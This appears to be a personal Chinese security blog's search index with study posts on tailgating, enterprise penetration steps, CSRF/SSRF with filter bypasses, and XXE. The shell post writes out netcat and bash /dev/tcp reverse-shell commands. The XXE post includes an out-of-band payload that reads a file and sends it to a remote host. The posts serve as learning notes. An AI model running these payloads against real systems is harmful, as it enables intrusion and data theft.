<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>什么是尾随攻击以及如何保护自己免受攻击</title>
    <link href="/2022/10/23/%E4%BB%80%E4%B9%88%E6%98%AF%E5%B0%BE%E9%9A%8F%E6%94%BB%E5%87%BB%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BF%9D%E6%8A%A4%E8%87%AA%E5%B7%B1%E5%85%8D%E5%8F%97%E6%94%BB%E5%87%BB/"/>
    <url>/2022/10/23/%E4%BB%80%E4%B9%88%E6%98%AF%E5%B0%BE%E9%9A%8F%E6%94%BB%E5%87%BB%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BF%9D%E6%8A%A4%E8%87%AA%E5%B7%B1%E5%85%8D%E5%8F%97%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>无论您是花时间上网还是在办公室工作，您都希望知道自己处于安全的环境中，让您高枕无忧。虽然我们大多数人都知道在上网时要采取预防措施――保护自己免受网络钓鱼攻击和其他网络威胁的侵害，但我们也应该注意自己的人身安全。</p><span id="more"></span><p>无论您是花时间上网还是在办公室工作，您都希望知道自己处于安全的环境中，让您高枕无忧。虽然我们大多数人都知道在上网时要采取预防措施――保护自己免受网络钓鱼攻击和其他网络威胁的侵害，但我们也应该注意自己的人身安全。</p><p>一个问题是尾随――一种社会工程攻击，其中有人可以物理访问企业以获取机密信息或造成其他伤害。</p><h2 id="什么是尾随攻击"><a href="#什么是尾随攻击" class="headerlink" title="什么是尾随攻击?"></a>什么是尾随攻击?</h2><p>尾随是一种社会工程攻击，未经授权的人可以物理访问禁区（可能是密码保护区域)，在那里他们可能会窃取敏感信息、损坏财产、破坏用户凭据，甚至<strong>在计算机上安装恶意软件</strong>。</p><p>“捎带”与尾随密切相关，但它涉及受骗员工的同意。因此，虽然工作人员可能不知道有人将他们尾随其后进入禁区，但黑客可能会说服工作人员提供访问权限，因为他们冒充送货司机。</p><h2 id="谁有尾随攻击的危险"><a href="#谁有尾随攻击的危险" class="headerlink" title="谁有尾随攻击的危险?"></a>谁有尾随攻击的危险?</h2><p>尤其有可能称为尾随诈骗目标的公司包括:</p><ul><li>有许多员工，经常进出场所</li><li>具有多个进入建筑物的入口点</li><li>定期接收食物、包裹、文件和其他物品的交付</li><li>有许多分包商为他们工作</li><li>员工没有在物理和网络安全协议方面接受过全面培训</li></ul><p>一般来说，拥有强大安全系统(包括使用生物识别、徽章或其他身份和信息安全措施)的公司可以更好地防止尾随和捎带攻击。</p><p>但这并不是说某些口齿伶俐的欺诈者无法说服某人让他们进入或找到绕过这些保护措施的方法。</p><h2 id="常见的追尾方法有哪些"><a href="#常见的追尾方法有哪些" class="headerlink" title="常见的追尾方法有哪些?"></a>常见的追尾方法有哪些?</h2><p>您在工作中应该注意的常见尾随攻击类型包括:</p><ul><li>有人走到你身后进入安全区域，这取决于你的常见礼貌，为他们保持门打开</li><li>他们看起来不像快递员或送货司机</li><li>他们看起来不像快递员或送货司机</li><li>有人拿着满满一手的东西来欺骗你为他们开门</li><li>声称他们丢失了工作ID或将其忘在家里的人，以便您准许他们进入</li></ul><h2 id="如何保护自己免受未遂攻击"><a href="#如何保护自己免受未遂攻击" class="headerlink" title="如何保护自己免受未遂攻击"></a>如何保护自己免受未遂攻击</h2><p>保护自己免受尾随攻击的部分原因在于了解该问题，提高您对工作的认识水平，并取决于您的雇主，建立更有效的安全系统。</p><p>一些解决方案包括:</p><h3 id="加强安全培训"><a href="#加强安全培训" class="headerlink" title="加强安全培训"></a>加强安全培训</h3><p>许多公司知道如何培训员工识别、避免和应对在线安全问题，但可能忘记对物理安全进行同样的努力。如何发现和处理威胁应该是培训的一部分，同时培养对周围环境和可能不合适的人的意识。<br>管理层应向每个人提供明确说明的安全政策，该政策可能会坚持在没有适当通行证或身份证明的情况下不允许任何人进入安全区域。随着安全策略的更新，所有员工都应了解更改和添加内容。</p><h3 id="智能徽章和卡片"><a href="#智能徽章和卡片" class="headerlink" title="智能徽章和卡片"></a>智能徽章和卡片</h3><p>如果您的大型企业分布在多个楼层，员工可能很难知道谁在那里工作，谁不在那里工作，从而使他们容易受到尾随和捎带攻击。要求智能徽章和卡进入受限区域有助于减少未经授权的入侵并提供更好的访问控制。<br>建立配备专门安保人员的配备齐全的接待区也可以成为更大安保系统的一部分。</p><h3 id="生物识别扫描仪"><a href="#生物识别扫描仪" class="headerlink" title="生物识别扫描仪"></a>生物识别扫描仪</h3><p>生物识别扫描仪是一种更先进的方法，可以为工人的身份提供适当的身份验证。他们扫描一个人的独特身体或听觉特征，并将其与经批准人员的数据库进行比较。</p><p>生物特征安全的例子包括:</p><ul><li>语音识别</li><li>虹膜识别</li><li>指纹扫描</li><li>面部识别</li><li>心率传感器</li></ul><h3 id="了解社会工程学"><a href="#了解社会工程学" class="headerlink" title="了解社会工程学"></a>了解社会工程学</h3><p>人们容易受到物理和网络攻击的一个原因是他们缺乏社会工程及其构成的威胁类型的教育。</p><p>工人需要了解全方位的社会工程技术和专业知识来保护自己，无论是在他们的社交媒体账户还是在实际工作环境中。</p><p>就他们而言，公司可以使用模拟网络钓鱼电子邮件和尾随攻击来提高意识并强调如何遵循协议来处理它们。</p><h3 id="视频监控"><a href="#视频监控" class="headerlink" title="视频监控"></a>视频监控</h3><p>如果进入企业的方式有很多，那么在所有入口设置视频监控可能是有意义的。先进的视频监控系统可以使用人工智能(AI)和视频分析来扫描进入人员的面部，并将其与员工特征数据库进行比较。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>企业网络的常见渗透思路</title>
    <link href="/2022/10/20/%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E5%B8%B8%E8%A7%81%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/"/>
    <url>/2022/10/20/%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E5%B8%B8%E8%A7%81%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<p>看到的一段话,觉得很有意思,转载一下。</p><span id="more"></span><p>搞企业，先扫描；<br>扫描器，商业好； &#x2F;&#x2F; 商业版扫描器通常比较强大<br>默认密，都知道； &#x2F;&#x2F; 很多系统存在默认账号默认口令<br>社工库，找一找；<br>邮箱号，先列好； &#x2F;&#x2F; 搜集企业员工个人邮箱<br>九头蛇，跑一跑； &#x2F;&#x2F; Hydra 是一个密码破解工具<br>搞不定，放大招；<br>发邮件，凭伪造； &#x2F;&#x2F; 发钓鱼邮件，比如冒充管理员让用户到指定页面去输入密码<br>没邮箱，搞网站；<br>二级域，皆可爆； &#x2F;&#x2F; 主域的防护通常较好，某些较弱的二级域可作为突破点<br>老漏洞，没修好； &#x2F;&#x2F; 有些老漏洞可能没有被恰当地修复，工作失误也可能让漏洞回归<br>新漏洞，刷一票； &#x2F;&#x2F; 大部分企业对漏洞能做到一周内修复就算三好学生了<br>干研发，Git  找； &#x2F;&#x2F; 常有人把为公司写的代码也传到github上，里面可能会包含口令等<br>源代码，全都要； &#x2F;&#x2F; 即使源码不包含口令，也很有助于发现漏洞<br>CDN ，  可以跳；<br>防火墙，可以撬；<br>堡垒机，可以绕；<br>云防护，可以秒； &#x2F;&#x2F; 各种防护措施都不是有了就行，需要正确地使用<br>是企业，没有哪家搞不了！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>正向shell和反向shell</title>
    <link href="/2022/10/19/%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell/"/>
    <url>/2022/10/19/%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell/</url>
    
    <content type="html"><![CDATA[<p>假如ubuntu、CentOS为目标服务器系统</p><p>kali为攻击者的系统，ip为：192.168.0.4，开放7777端口且没被占用</p><p>最终是将ubuntu、CentOS的shell反弹到kali上</p><h3 id="正向反弹shell"><a href="#正向反弹shell" class="headerlink" title="正向反弹shell"></a>正向反弹shell</h3><h5 id="目标机-ubuntu或者CentOS-上面输入"><a href="#目标机-ubuntu或者CentOS-上面输入" class="headerlink" title="目标机(ubuntu或者CentOS)上面输入"></a>目标机(ubuntu或者CentOS)上面输入</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc -lvp 端口号 -e <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><h5 id="攻击机上输入"><a href="#攻击机上输入" class="headerlink" title="攻击机上输入"></a>攻击机上输入</h5><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nc</span> <span class="hljs-built_in">ip</span> 端口号<br></code></pre></td></tr></table></figure><p>正向反弹是目标机先执行nc命令，然后攻击机上再进行nc监听，即可反弹shell。</p><p>需要目标机安装nc。</p><h3 id="反向反弹shell"><a href="#反向反弹shell" class="headerlink" title="反向反弹shell"></a>反向反弹shell</h3><p>方法1：bash反弹</p><h5 id="被控制端-bash-i-gt-amp-x2F-dev-x2F-tcp-x2F-攻击机的ip-x2F-port-0-gt-amp-1"><a href="#被控制端-bash-i-gt-amp-x2F-dev-x2F-tcp-x2F-攻击机的ip-x2F-port-0-gt-amp-1" class="headerlink" title="被控制端:bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机的ip&#x2F;port 0&gt;&amp;1"></a>被控制端:bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机的ip&#x2F;port 0&gt;&amp;1</h5><p><img src="/%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell/image-20221019201817575.png" alt="image-20221019201817575"></p><h5 id="但首先需要在攻击机上使用nc监听端口：nc-lvp-端口号"><a href="#但首先需要在攻击机上使用nc监听端口：nc-lvp-端口号" class="headerlink" title="但首先需要在攻击机上使用nc监听端口：nc -lvp 端口号"></a>但首先需要在攻击机上使用nc监听端口：nc -lvp 端口号</h5><p><img src="/images/image-20221019201951687.png" alt="image-20221019201951687"></p><p>此时就可以获得shell</p><p><img src="/images/image-20221019202129236.png" alt="image-20221019202129236"></p><p>此方法在ubuntu下不会反弹成功，CentOS可以反弹成功</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>​无论是正向shell还是反弹shell，都是A控制B，只是请求端不一样，一个是主动控制，一个被动控制，与<a href="https://so.csdn.net/so/search?q=%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86&spm=1001.2101.3001.7020">正向代理</a>和反向代理一样。<br>​反弹shell就会更加的稳定，用途更大。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>简述CSRF和SSRF的区别</title>
    <link href="/2022/10/16/%E7%AE%80%E8%BF%B0CSRF%E5%92%8CSSRF%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2022/10/16/%E7%AE%80%E8%BF%B0CSRF%E5%92%8CSSRF%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<p>目前正在了解Web漏洞，正巧在各类面试题中都看到这样一道面试题：</p><p>“请简述CSRF、SSRF与会话重放的区别”</p><p>因为最近正好了解到CSRF和SSRF，会话重放还不太熟悉，所以将会话重放暂且不提，在以下总结CSRF和SSRF的概念与区别。</p><span id="more"></span><p>目前正在了解Web漏洞，正巧在各类面试题中都看到这样一道面试题：</p><p>“请简述CSRF、SSRF与会话重放的区别”</p><p>因为最近正好了解到CSRF和SSRF，会话重放还不太熟悉，所以将会话重放暂且不提，在以下总结CSRF和SSRF的概念与区别。</p><h2 id="CSRF："><a href="#CSRF：" class="headerlink" title="CSRF："></a>CSRF：</h2><p>CSRF，本名为Cross-site requestforgery，也就是跨站请求伪造。</p><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">跨站请求伪造(英语<span class="hljs-symbol">:Cross-site</span> request forgery) ，也被称为one-click attack或者session riding，通常缩写为<span class="hljs-title class_">CSRF</span>或者<span class="hljs-title class_">XSRF</span><br>是一种挟持用户在当前已登录的web应用程序上执行非本意的操作的攻击方法。<br>例如<span class="hljs-symbol">:</span>攻击者盗用了你在某个网站的身份,以你的名义发送恶意请求。<br></code></pre></td></tr></table></figure><h4 id="与XSS不得不说的关系"><a href="#与XSS不得不说的关系" class="headerlink" title="与XSS不得不说的关系"></a>与XSS不得不说的关系</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">说到CSRF，不得不提一下XSS。CSRF看起来好像和XSS跨站脚本攻击有着“不得不说的秘密”，实则却是两个不同维度的情况。从名字上来看，同为跨站攻击，XSS攻击是跨站脚本攻击，CSRF攻击是请求伪造，也就是CSRF攻击本不是出自用户之手，却经过第三方恶意攻击者的处理，伪装成了受信任用户的“亲历亲为”。<br>XSS是实现CSRF的诸多途径中的一条，但并不是唯一的一条。<br></code></pre></td></tr></table></figure><h4 id="CSRF能做的事"><a href="#CSRF能做的事" class="headerlink" title="CSRF能做的事"></a>CSRF能做的事</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">以你的名义：<br>发邮件<br>发消息<br>财产操作比如转账或者购买商品<br>新建文件<br>增删改查的操作也可以做等等<br></code></pre></td></tr></table></figure><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>CSRF利用前提</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1.登录信任网站，并在浏览器中保存相应的cookie<br>2.在不退出登录的情况下，访问恶意网站<br></code></pre></td></tr></table></figure><h4 id="分类与利用-GET-CSRF-和-POST-CSRF"><a href="#分类与利用-GET-CSRF-和-POST-CSRF" class="headerlink" title="分类与利用    GET CSRF 和 POST CSRF"></a>分类与利用    GET CSRF 和 POST CSRF</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">对于很多网站来说，即使是一些重要的操作使用<span class="hljs-keyword">POST</span>来提交请求，但是服务器再接收请求的时候并没有严格区分<span class="hljs-keyword">POST</span>和GET。在PHP中滥用<span class="hljs-variable">$_REQUEST</span>就是例子。<br>如果服务端已经区分了GET,<span class="hljs-keyword">POST</span>只用<span class="hljs-keyword">POST</span>请求数据，可以通过制造一个隐藏的表单，并通过js代码自动提交伪造的表单。<br></code></pre></td></tr></table></figure><h4 id="CSRF漏洞挖掘"><a href="#CSRF漏洞挖掘" class="headerlink" title="CSRF漏洞挖掘"></a>CSRF漏洞挖掘</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>）冒充身份:订阅<span class="hljs-regexp">/关注/</span>转发/投票操作，删除文件，更改配置等<br><span class="hljs-number">2</span>）帐户接管:密码修改，邮箱绑定，第三方帐户关联<br><span class="hljs-number">3</span>）其他:登录<span class="hljs-regexp">/注册/</span>注销/注册<br><span class="hljs-number">4</span>）安全设计原则:CSRF登录后令牌未更新、登出后未注销等<br></code></pre></td></tr></table></figure><h4 id="CSRF漏洞防御"><a href="#CSRF漏洞防御" class="headerlink" title="CSRF漏洞防御"></a>CSRF漏洞防御</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">从漏洞原理来看：<br><span class="hljs-number">1</span>.关键操作增加验证码机制(比如说支付密码)(增加带有大量噪点的验证码，杜绝代码能够识别的简单验证码，当然了也经常被绕过)<br><span class="hljs-number">2</span>.验证<span class="hljs-built_in">referer</span>(采用同源策略,referer记录着数据包的来源地址,来判断请求的合法性,但是这个可以伪造)<br><span class="hljs-number">3</span>.使用<span class="hljs-built_in">Token</span>(每次访问都会改变)(令牌是一种将表单value的加密算法生成不同的加密结果,在服务器端进行验证)<br><br>从漏洞利用前提条件来看：<br>用户需要养成访问完一个网站之后，点击退出帐户的好习惯<br>（如果用户换浏览器登录则无法继续CSRF漏洞, 因为cookie只存在登录的那个浏览器）<br></code></pre></td></tr></table></figure><h2 id="SSRF："><a href="#SSRF：" class="headerlink" title="SSRF："></a>SSRF：</h2><p>SSRF,也就是Server Side RequestForgery—服务器端请求伪造。</p><h4 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">从字面上来看，与CSRF不同的是，它是服务器端发出的请求伪造而非从用户一端提交。别误会，作为受信任用户，服务器当然不可能做出损害用户信息的事。它是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。因为它是由服务端发起的，所以它能够请求到与它相连但与外网隔离的内部系统。由于服务端提供了从其他服务器应用获取数据的功能（例如分享等功能)且没有对目标地址做过滤与限制，给予了攻击者乘虚而入的机会。比如从指定<span class="hljs-built_in">URL</span>地址获取网页文本内容、加载指定地址的图片、下载等等。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。<br></code></pre></td></tr></table></figure><h4 id="SSRF能做的事情"><a href="#SSRF能做的事情" class="headerlink" title="SSRF能做的事情"></a>SSRF能做的事情</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">可以对外网服务器所在的内网、本地进行端口扫描，获取一些服务的banner信息。<br>攻击运行在内网或者本地的应用程序。<br>对内网web应用进行指纹识别，通过访问默认文件实现。<br>攻击内外网的web应用。sql注入、struct2、redis等。<br>利用<span class="hljs-built_in">file</span>协议读取本地文件等。<br></code></pre></td></tr></table></figure><h4 id="SSRF常见限制"><a href="#SSRF常见限制" class="headerlink" title="SSRF常见限制"></a>SSRF常见限制</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">1.</span>限制为http:<span class="hljs-comment">//www.xxx.com域名</span><br>采用http基本身份认证的方式绕过。即@<br>http:<span class="hljs-comment">//www.xXX.com@www.XXC.com</span><br><span class="hljs-number">2.</span>限制请求IP不为内网地址<br>当不允许ip为内网地址时<span class="hljs-comment">(1)</span>采取短网址绕过<span class="hljs-comment">(2)</span>采取特殊域名<span class="hljs-comment">(3)</span>采取进制转换<br><span class="hljs-number">3.</span>限制请求只为http协议<span class="hljs-comment">(1)</span>采取<span class="hljs-number">302</span>跳转   <span class="hljs-comment">(2)</span>采取短地址<br></code></pre></td></tr></table></figure><h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式:"></a>绕过方式:</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">限制前缀@  <br>限制IP地址句号  <br>限制网址www<span class="hljs-selector-class">.localhost</span>.com/使用 短链接(<span class="hljs-built_in">curl</span>(暂不能用)  file_get_contents)    <br>特殊网址绕过sslip.io和nip<span class="hljs-selector-class">.io</span>    <br>IP的进制转换十进制十六进制<br></code></pre></td></tr></table></figure><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-number">1</span>.过滤返回信息，如果web应用数去获取某一类型文件，在把结果返回给用户之前先验证信息是否符合标准。<br>例如:当攻击者利用<span class="hljs-string">&quot;识别图片&quot;</span>下的该漏洞远程包含一个文件，可以通过在服务器上验证返回数据是否是纯像素，来进行过滤。<br><span class="hljs-number">2</span>.统一错误页<br><span class="hljs-number">3</span>.限制请求端口为http常用端口<span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">8090</span><br><span class="hljs-number">4</span>.内网<span class="hljs-built_in">IP</span>黑名单，避免应用被用来获取内网数据，攻击内网<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，CSRF是服务器端没有对用户提交的数据进行严格的把控，导致攻击者可以利用用户的Cookie信息伪造用户请求发送至服务器。而SSRF是服务器对用户提供的可控URL地址过于信任，没有经过严格检测，导致攻击者可以以此为跳板攻击内网或其他服务器。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>XXE</title>
    <link href="/2022/10/13/XXE/"/>
    <url>/2022/10/13/XXE/</url>
    
    <content type="html"><![CDATA[<h4 id="XXE是什么"><a href="#XXE是什么" class="headerlink" title="XXE是什么"></a>XXE是什么</h4><p>做数据传输</p><p>xxe是<strong>xml外部实体注入</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">简单来说，XXE(<span class="hljs-type">XML</span> <span class="hljs-keyword">External</span> Entity Injection)就是<span class="hljs-type">XML</span>外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。<br>例如，如果你当前使用的程序为PHP，则可以将libxml_disable_entity_loader设置为<span class="hljs-keyword">TRUE</span>来禁用外部实体，从而起到防御的目的。<br>XXE漏洞触发的点往往是可以上传<span class="hljs-type">XML</span>文件的位置，没有对上传的<span class="hljs-type">XML</span>文件进行过滤，导致可以上传恶意的<span class="hljs-type">XML</span>文件。<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">XML被设计用来传输和存储数据<br><span class="hljs-selector-tag">html</span>被设计用来显示数据<br></code></pre></td></tr></table></figure><h5 id="XML基本格式与基本语法"><a href="#XML基本格式与基本语法" class="headerlink" title="XML基本格式与基本语法"></a>XML基本格式与基本语法</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">所有XML元素都必须有关闭标签<br>XML标签对大小写敏感<br>XML必须正确地嵌套<br>XML文档必须有根元素<br>XML的属性值需加引号<br>可以将多个字符放入&lt;![CDATA[内容]]&gt;进行转义<br></code></pre></td></tr></table></figure><h5 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h5><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-built_in">XML</span>文档有自己的一个格式规范，这个格式规范是由一个叫做DTD(document <span class="hljs-keyword">type</span> definition)的东西控制的。<br>DTD用来为<span class="hljs-built_in">XML</span>文档定义语义约束。可以嵌入在<span class="hljs-built_in">XML</span>文档中(内部声明),也可以独立的放在另外一个单独的文件中(外部引用)。是<span class="hljs-built_in">XML</span>文档中的几条语句,用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。<br><br>内部声明:<br><span class="hljs-meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span>  例: <span class="hljs-meta">&lt;!DOCTYOE <span class="hljs-keyword">test</span> <span class="hljs-keyword">any</span>&gt;</span><br><br>外部声明:<br> <span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;文件名&quot;</span>&gt;</span> 例:<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;http://www.test.com/evil.dtd&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="XML预定义五个实体引用"><a href="#XML预定义五个实体引用" class="headerlink" title="XML预定义五个实体引用"></a>XML预定义五个实体引用</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;lt;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;amp;</span><span class="hljs-symbol">&amp;apos;</span><span class="hljs-symbol">&amp;quot;</span><br>&lt;&gt;&amp;&#x27;&quot;<br></code></pre></td></tr></table></figure><h5 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h5><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">字符实体<br>命名实体<br>外部实体<br>参数实体<br>内部实体<br>普通实体和参数实体都分为内部实体和外部实体两种，外部实体定义需要加上<span class="hljs-keyword">SYSTEM</span>关键字，其内容是URL所指向的外部文件实际的内容。如果不加<span class="hljs-keyword">SYSTEM</span>关键字，则为内部实体，表示实体指代内容为字符串。<br></code></pre></td></tr></table></figure><h5 id="XML外部实体示例"><a href="#XML外部实体示例" class="headerlink" title="XML外部实体示例"></a>XML外部实体示例</h5><h5 id="无回显时使用"><a href="#无回显时使用" class="headerlink" title="无回显时使用"></a>无回显时使用</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">BP抓包后,修改成POST模式,在后面加上<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/phpStudy/1.txt&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml">文件一:</span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span></span></span><br><span class="hljs-meta"><span class="language-xml">        <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://10.0.0.19/?%file;&#x27;&gt;&quot;</span></span></span><br><span class="hljs-meta"><span class="language-xml">        &gt;</span></span><br><span class="language-xml"></span><span class="language-perl">        %all;</span><span class="language-xml"></span><br><span class="language-xml">        </span><br><span class="language-xml">文件二</span><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span></span><br><span class="hljs-meta"><span class="language-xml"> <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/Windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"> <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://www.localhost.com/xxe_file.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%dtd;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%send;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span 